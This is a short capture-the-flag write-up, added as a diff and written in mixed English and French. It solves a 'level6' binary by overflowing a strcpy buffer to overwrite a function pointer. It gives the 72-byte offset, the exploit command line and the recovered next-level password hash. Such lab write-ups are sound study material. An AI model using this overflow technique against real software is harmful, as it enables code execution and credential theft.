@@ -1,0 +1,10 @@
+i have a file who puts Nope when ./level6 "test"
+Its because  *eax_1 = 0x8048468;
+    strcpy(eax, argv[1]);
+    return *eax_1();
+    So we need to overwrite eax_1 using the overflow strcopy
+    0xbffff8fb memoire ou va overwrite
+    Donc on ajoute juste l adresse memoire de la function n (qui run cat /home/user/.level7) apres overflow donc
+    run $(python -c 'print "\x41" * 72 + "\x54\x94\x04\x08"')
+    ./level6 $(python -c 'print "\x41" * 72 + "\x54\x94\x04\x08"')
+    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
